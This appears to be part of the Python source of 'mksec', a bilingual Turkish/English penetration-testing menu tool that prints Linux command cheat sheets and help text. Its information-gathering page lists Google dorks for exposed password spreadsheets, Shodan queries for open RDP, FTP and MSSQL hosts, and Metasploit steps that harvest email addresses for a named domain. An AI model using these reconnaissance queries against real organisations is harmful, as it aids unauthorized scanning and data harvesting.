        print("\x1b[1m\x1b[33m\x1b[7mKomut Satırı Arayüzü\x1b[0m\x1b[1m\n6 farklı konsol üzerinden çalışabiliriz. Bunlardan iki tanesi grafiksel dört tanesi komut satırı arayüzüdür. Şekli aşağıdaki grafiktedir.\n\x1b[33m>> CTRL + ALT + F3\n\x1b[33m>> ALT + F1 or ALT F2\x1b[37m (Grafiksel arayüz)\n\x1b[33m>> ALT + F3, F4, F5 or F6\x1b[37m (Komut satırı arayüzü)\x1b[34m\n|----------------------------------------------|\n|  Grafiksel  |        Komut Satırı Arayüzü    |\n|tty1	tty2  |  tty3	 tty4	 tty5	 tty6  |\n|----------------------------------------------|\x1b[37m\n\n\x1b[1m\x1b[33m\x1b[7mCommand Line Interface\x1b[0m\x1b[1m\nWe can work through 6 different consoles. Two of them are graphical and four are command line interfaces. Its shape is in the graphic below.\n\x1b[33m>> CTRL + ALT + F3\n\x1b[33m>> ALT + F1 or ALT F2\x1b[37m (Graphical interface)\n\x1b[33m>> ALT + F3, F4, F5 or F6\x1b[37m (Command line interface)\x1b[34m\n|----------------------------------------------|\n|  Graphical  |        Command Line Interface  |\n|tty1	tty2  |  tty3	 tty4	 tty5	 tty6  |\n|----------------------------------------------|\x1b[37m\n")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[command_line_interface]\033[37m\x1b[0m ")
            UserInputs(uinput+"lin")

    def alc():
        RandomBannerSelector()
        print("\x1b[1m\x1b[37m\n01\x1b[36m English\n\x1b[37m02\x1b[36m Turkish\n\x1b[37m")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[all_linux_commands]\033[37m\x1b[0m ")
            if uinput == "1" or uinput == "01":
                print("\x1b[1m\x1b[33mFile Commands\x1b[37m\n\x1b[33m=============\x1b[37m\nls –> list directory\nls -al –> list directory with hidden files\ncd [directory] –> change directory\ncd –> go to home directory\npwd –> view current directory\nmkdir [directory] –> create a new directory\nrm [file] –> delete file\nrm -r [directory] -> delete directory\nrm -f [file] –> force delete file\nrm -rf [directory] –> force delete directory\ncp [directory1] [directory2] –> copy directory1 to directory2\ncp -r [directory1] [directory2] –> copy directory1 to directory2; if index2 doesn't exist, create this\nmv [file1] [file2] –> rename or move file1 to file2. If file2 exists, move the contents of file1 into file2\nln -s [file] [link] –> create symboliclink to file or link\ntouch [file] –> create or update file\ncat > [file] –> create standard input to file\nmore [file] –> view the contents of the file\nhead [file] –> show first 10 lines of file\ntail [file] –> show last 10 lines of file\ntail -f [file] –> show last 10 lines of file and all\n\x1b[33mSystem Information\n\x1b[33m==================\x1b[37m\ndate –> show current date and time\ncal –> show this month's calendar\nuptime –> show current service time\nw –> show who is online\nwhoami –> show logged in person\nfinger [user] –> information about the user\nuname -a –> show kernel info\ncat /proc/cpuinfo –> cpu info\ncat /proc/meminfo –> memory information\nman [command] –> show manual for command\ndf –> show disk usage\ndu –> show size usage of directories\nfree –> show memory and swap usage\nwhereis [app] –> probable location of the app\nwhich [app] –> show which application directories are running by default\n\x1b[33mProcess Management\n==================\x1b[37m\nps –> show active processes\ntop –> show all processes\nkill [pid] –> kill process with pid header\nkillall proc –> End all processes with title proc *\nbg –> lists stopped or trailing tasks; resumes a stopped task in the background\nfg –> reveals the most current task\nfg [n] –> Brings task n to the front\n\x1b[33mCompression\n===========\x1b[37m\ntar cf [file.tar] [files] –> Create a file named file.tar containing the files in the directory.\ntar xf [file.tar] –> Extract file.tar\ntar czf [file.tar.gz] files –> Generate a tar file with gzip\ntar xzf [files.tar.gz] –> Extract directory with gzip\ntar cjf [file.tar.bz2] –> Prepare a tar file with bzip2\ntar xjf [file.tar.bz2] –> Extract directory with bzip2\ngzip [file] –> compress file and rename to file.gz\ngzip -d [file.gz] –> Extract file.gz back as a file\n\x1b[33mNetwork\n=======\x1b[37m\nping [host] –> ping the host and show the result\nwhois [domain] –> whois information for the domain\ndig [domain] –> DNS information for the domain\ndig -x [host] –> reverse host solution\nwget [file] –> download file\nwget -c [file] –> continue download\n\x1b[33mFile Permissions\n==============\x1b[37m\nchmod [code] [file] –> change file permissions, these permissions vary for different categories (like user, group and everyone):\n• 4 = read (r)\n• 2 = write (w)\n• 1 = execute (x)\nexamples:\nchmod 777 –> read, write, execute for everyone\nchmod 755 –> rwx is for the owner, rx is for the group and everyone.\nfor more: man chmod\n\x1b[33mSetup\n=====\x1b[37m\nInstallation from source:\n./configure\nmake\nmake install\ndpkg -i pkg.deb –> package installation (debian)\nrpm -Uvh pkg.rpm –> package installation (RPM)\n\x1b[33mSSH\n===\x1b[37m\nssh [user@host] –> connect to server as user\nssh -p [port] [user@host] –> connect to server via port as user\nssh-copy-id [user@host] –> add key for user and login with key and no password\n\x1b[33mSearch\n=====\x1b[37m\ngrep [pattern] [files] –> look for patterns in files\ngrep -r [pattern] [dir] –> search the directory recursively for the pattern\n[command] | grep [pattern] –> look for pattern in command output\nlocate [file] –> search all instances of file\n\x1b[33mShortcuts\n=========\x1b[37m\nCtrl+C –> stops the current command\nCtrl+Z –> stops the current command, resumes the command with 'fg' in front or 'bg' in back\nCtrl+D –> log out like exit\nCtrl+W –> deletes a word in a line\nCtrl+U –> deletes the entire row\nCtrl+R –> bring the last command to the front\nCtrl+P –> show last command\n!! -> repeat the last command\nexit –> log out\x1b[37m")
            elif uinput == "2" or uinput == "02":
                print("\x1b[1m\x1b[33mDosya Komutları\x1b[37m\n\x1b[33m===============\x1b[37m\n\nls –> dizini listele\nls -al –> dizini gizli dosyalarla birlikte listele\ncd [dizin] –> dizini değiştir\ncd –> ev dizinine git\npwd –> o anda bulunulan dizini görüntüle\nmkdir [dizin] –> yeni bir dizin oluştur\nrm [dosya] –> dosya sil\nrm -r [dizin] –> dizin sil\nrm -f [dosya] –> dosya'yı silmeye zorla\nrm -rf [dizin] –> dizini silmeye zorla\ncp [dizin1] [dizin2] –> dizin1 'i, dizin2 'ye kopyala\ncp -r [dizin1] [dizin2] –> dizin1'i, dizin2'ye kopyala; eğer dizin2 yoksa oluştur\nmv [dosya1] [dosya2] –> dosya1 'i dosya2 'ye yeniden adlandır veya taşı. eğer, dosya2 varsa, dosya1 içeriğini dosya2 içine taşı\nln -s [dosya] [link] –> dosya veya link'e semnoliklink oluştur\ntouch [dosya] –> dosya'yı oluştur veya güncelle\ncat > [dosya] –> dosya'ya standart girdi oluştur\nmore [dosya] –> dosya'nın içeriğini görüntüle\nhead [dosya] –> dosya'nın ilk 10 satırını göster\ntail [dosya] –> dosya'nın son 10 satırını göster\ntail -f [dosya] –> dosya'nın son 10 satırını ve tümünü göster\n\x1b[33mSistem Bilgisi\n\x1b[33m==============\x1b[37m\ndate –> şu anki tarih ve saati göster\ncal –> bu ayın takvimini göster\nuptime –> şu anki hizmet süresini göster\nw –> kimin online olduğunu göster\nwhoami –> oturum açan kişiyi göster\nfinger [kullanıcı] –> kullanıcı hakkında bilgi\nuname -a –> kernel bilgisini göster\ncat /proc/cpuinfo –> cpu bilgisi\ncat /proc/meminfo –> hafıza bilgisi\nman [komut] –> komut için manueli göster\ndf –> disk kullanımı göster\ndu –> dizinlerin boyut kullanımı göster\nfree –> hafıza ve swap kullanımı göster\nwhereis [uygulama] –> uygulama muhtemel yeri\nwhich [uygulama] –> varsayılan olarak hangi uygulama dizinlerinin çalıştığını göster\n\x1b[33mİşlem Yönetimi\n==============\x1b[37m\nps –> etkin işlemleri göster\ntop –> tüm işlemleri göster\nkill [pid] –> pid başlıklı işlemi sonlandır\nkillall proc –> proc * başlıklı tüm işlemleri bitir\nbg –> durdurulmuş veya arkada süren görevleri listeler; arkada durdurulmuş bir görevi kaldığı yerden sürdürür\nfg –> en güncel görevi ortaya koyar\nfg [n] –> n adlı görevi öne getirir\n\x1b[33mSıkıştırma\n==========\x1b[37m\ntar cf [dosya.tar] [dosyalar] –> dizindeki dosyaları içeren dosya.tar adında bir dosya oluştur.\ntar xf [dosya.tar] –> dosya.tar dosyasındakileri çıkar\ntar czf [dosya.tar.gz] [dosyalar] –> Gzip ile bir tar dosyası oluştur\ntar xzf [dosyalar.tar.gz] – Gzip ile dizin çıkar\ntar cjf [dosya.tar.bz2] –> Bzip2 ile bir tar dosyası hazırla\ntar xjf [dosya.tar.bz2] –> Bzip2 ile dizin çıkar\ngzip [dosya] –> dosya sıkıştır ve dosya.gz olarak yeniden adlandır\ngzip -d [dosya.gz] –> dosya.gz'yi dosya olarak geri çıkar\n\x1b[33mAğ\n==\x1b[37m\nping [host] –> host'a ping at ve sonucu göster\nwhois [domain] –> domain için whois bilgisi\ndig [domain] –> domain için DNS bilgisi\ndig -x [host] –> host çözümünü ters çevir\nwget [dosya] –> dosya indir\nwget -c [dosya] –> durdurulmuş indirmeye devam\n\x1b[33mDosya İzinleri\n==============\x1b[37m\nchmod [kod] [dosya] –> dosya izinlerini değiştir. bu izinler farklı kategorilere göre değişir (kullanıcı, grup ve herkes gibi):\n• 4 = okuma (r) \n• 2 = yazma (w)\n• 1 = çalıştırma (x)\nörnekler:\nchmod 777 –> herkes için oku, yaz, çalıştır\nchmod 755 –> rwx sahibi için, rx grup ve herkes için.\ndaha fazlası için: man chmod\n\x1b[33mKurulum\n=======\x1b[37m\nKaynaktan kurulum:\n./configure\nmake\nmake install\ndpkg -i [pkg.deb] –> paket kurulumu (Debian)\nrpm -Uvh [pkg.rpm] – paket kurulumu (RPM)\n\x1b[33mSSH\n===\x1b[37m\nssh [kullanıcı@host] –> kullanıcı olarak sunucuya bağlan\nssh -p port [user@host] –> kullanıcı olarak port üzerinden sunucuya bağlan\nssh-copy-id [user@host] –> kullanıcı için anahtarı ekleyin ve anahtarla ve şifresiz olarak oturum açın\n\x1b[33mArama\n=====\x1b[37m\ngrep [pattern] [dosyalar] –> dosyalarda kalıp arayın\ngrep -r [pattern] [dir] –> dizin içinde kalıbı tekrarlayarak arayın\n[komut] | grep [pattern] –> komut çıktısında kalıp arayın\nlocate [dosya] –> dosya'nın tüm örneklerini arayın\n\x1b[33mKısayollar\n==========\x1b[37m\nCtrl+C –> şu anki komutu durdurur\nCtrl+Z –> şu anki komutu durdurur, önde fg ile veya arkada bg ile komut işlemini kaldığı yerden sürdürür\nCtrl+D –> exit gibi oturumu kapatır\nCtrl+W –> satırdaki bir kelimeyi siler\nCtrl+U –> tüm satırı siler\nCtrl+R –> son komutu öne getir\nCtrl+P –> son komutu göster\n!! -> son komutu tekrar et\nexit –> oturumdan çık\x1b[37m\n")
            UserInputs(uinput+"lin")

    def informationGatheringMore():
        os.system("clear")
        print("\x1b[1m\x1b[33mMore about Information Gathering\x1b[37m\n\x1b[32m'archive.org'\x1b[37m sitesinden, hedef sitenin gecmis ekran goruntulerini inceleyebilirsiniz.\n\n\x1b[32mwhois\x1b[37m: domainin bilgilerini icerir. domainin kayit ve suresinin bitis tarihi, host edildigi firmanin name server bilgileri de yer alir.\n\x1b[36mex: whois microsoft.com\x1b[37m\n\n\x1b[32mbing:\x1b[37m ip addr aramasi yaparak subdomain bulmak. \x1b[36mex:\x1b[37m site:168.148.56.21\n\n\x1b[32mping:\x1b[37m ping atarak ip adresini ogrenebilirsiniz \x1b[36mex:\x1b[37m google.com\n\n\x1b[32mgoogle dorks\x1b[37m\n\x1b[32m============\x1b[37m\n\x1b[37m\x1b[36msite:\x1b[37mmertkaragoz.com\n\x1b[36mfiletype:\x1b[37mpdf\n\x1b[36minurl:\x1b[37madmin\n\x1b[36mintitle:\x1b[37mlinux nedir\n\x1b[36mintext:\x1b[37mlinux isletim sistemidir\n\x1b[36mcache:\x1b[37mmertkaragoz.com\n\x1b[33mex:\x1b[37m intitle:webcam 7 inurl:8080 -intext:8080\n\x1b[33mex:\x1b[37m xls 'username | password' site:.com\n\n\x1b[32mshodan dorks\x1b[37m\n\x1b[32m============\x1b[37m\n\x1b[36mproduct:\x1b[37mngnix\n\x1b[36mcity:\x1b[37mistanbul\n\x1b[36mcountry:\x1b[37mTR\n\x1b[36mport:\x1b[37m3389\n\x1b[36mhostname:\x1b[37mgoogle.com\n\x1b[36mnet\x1b[37m:178.156.32.48\n\x1b[36mos:\x1b[37mlinux\n\x1b[32mex:\x1b[37m product:cisco country:TR\n\x1b[32mex:\x1b[37m product:nginx city:dallas country:US port:8080 os:linux\n\x1b[32mex:\x1b[37m country:TR port:3389\n\x1b[32mex:\x1b[37m country:TR port:21 'anonymous user logged in'\n\x1b[32mex:\x1b[37m country:TR port:1434\n\x1b[32mex:\x1b[37m Cisco 200 OK\n\n\x1b[36mmsfconsole\x1b[37m ile e-mail bilgileri toplamak icin konsola sirasiyla yaziniz\n\x1b[33m1)\x1b[37m msfconsole\n\x1b[33m2)\x1b[37m use auxiliary/gather/search_email_collector\n\x1b[33m3)\x1b[37m show options\n\x1b[33m4)\x1b[37m set DOMAIN nasa.gov\n\x1b[33m5)\x1b[37m run\x1b[37m\n")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[information_gathering_more]\033[37m\x1b[0m ")
            UserInputs(uinput+"information")

    def about():
        print("""\x1b[1m\x1b[36m©Copyright 2021 mksec\n\n\x1b[0mversion: 1.08\x1b[37m\x1b[1m\n\n\x1b[33mWritten by:\x1b[37m Mert Karagoz (generatorexit) @generatorexit\n\n\x1b[31mDISCLAIMER:\x1b[37m This is *only* for testing purposes and can only be used where strict consent has been given. Do not use this for illegal purposes, period.\nplease read the license under readme/license for the licensing of mksec.\n\n\x1b[33m[mksec Tutorial]\x1b[37m\nFor a full document on how to use mksec, [Visit the mksec user manual] (https://github.com/generatorexit/mksec/raw/master/readme/user_manual.pdf)\n\n\x1b[33m[Features]\x1b[37m\nmksec, linux icin hazirlanmis acik kaynakli bir sizma testi aracidir. mksec, sizma testi araclarini daha hizli bir sekilde kullanmanizi saglar.\nMert Karagoz tarafindan hazirlanan araclari da icerisinde bulundurur. hicbir sirketin, firmanin or hacker grubunun urunu degildir.\n\n\x1b[33m[Bugs and Enhancements]\x1b[37m\nFor bug reports or enhancements, please open an [issue]\n(https://github.com/generatorexit/mksec/issues) here.\n\n\x1b[33m[Supported Platforms]\x1b[37m\nKali Linux\n\n\x1b[33m[Install mksec]\x1b[37m\nkurulum yazilacak\n\n\x1b[33m[mksec Development Team]\x1b[37m\n@generatorexit\n\n\x1b[33m[Former Developers of mksec]\x1b[37m\n@generatorexit\n\nSpecial thanks to the following person who has contributed to mksec:\n@nidagonder\n\x1b[37m""")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[about]\033[37m\x1b[0m ")
            UserInputs(uinput+"mainmenu")

    def help():
        print("""\x1b[1m\x1b[36mCore Commands\x1b[37m\n\x1b[36m=============\x1b[37m\n\n\x1b[33mCommand\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m     \x1b[33m===========\x1b[37m\n?           Help menu\nhelp        Help menu\nclear       Clears the screen\nabout       Shows information about "mksec"\nno banner   Remove Banner\nbanner      Adds banners. If there is a banner it will change it\nexit        Exit the console\nquit        Exit the console\n\n\x1b[36mTool Commands\x1b[37m\n\x1b[36m=============\x1b[37m\n\n\x1b[33mCommand\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m     \x1b[33m===========\x1b[37m\ninfo        Displays information about tool\noptions     Displays global options for tool\nset         Sets a context-specific variable to a value\nrun         Runs the tool\nclear       Clears the screen\nback        Move back from the current context\nexit        Exit the console\nquit        Exit the console\n\x1b[37m""")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[help]\033[37m\x1b[0m ")
            UserInputs(uinput+"mainmenu")
    #mksectools
    def pythonCompiler():
        import py_compile
        os.system("""echo \x1b[1m' 
        _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
        |                                                       |
        |                    python compiler                    |
        |                                                       |
        |  .py uzantili dosyayi .pyc uzantili dosyaya cevirir   |
        |                                                       |
        |  1  python compiler                                   |
        |                                                       |
        |  back go back                                           |
        |                                                       |
        |-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-|'
        """)
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        if uinput == "1":
            os.system("echo 'ex: /root/Desktop/mksec.py'")
            userfile = input("\x1b[1m\033[36m[mksec]\033[36m[file.location]\033[37m\x1b[0m ")
            py_compile.compile(userfile)
        elif uinput == "back":
            os.system("clear")
            mksectools()
        else:
            os.system("clear")
            pythonCompiler()

    MainMenu()

except KeyboardInterrupt:
    print("\x1b[1mUse the 'exit' command to quit.")
    NoBanner()